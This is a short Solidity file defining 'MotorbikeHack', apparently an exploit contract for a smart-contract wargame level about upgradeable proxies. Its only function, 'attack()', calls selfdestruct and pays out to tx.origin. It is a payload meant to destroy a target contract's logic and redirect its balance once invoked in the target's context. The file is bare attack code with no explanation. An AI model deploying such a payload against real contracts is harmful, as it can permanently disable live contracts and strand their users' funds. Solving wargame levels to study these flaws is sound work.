// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "forge-std/console.sol";

contract MotorbikeHack {
    function attack() external {
        selfdestruct(payable(tx.origin));
    }
}
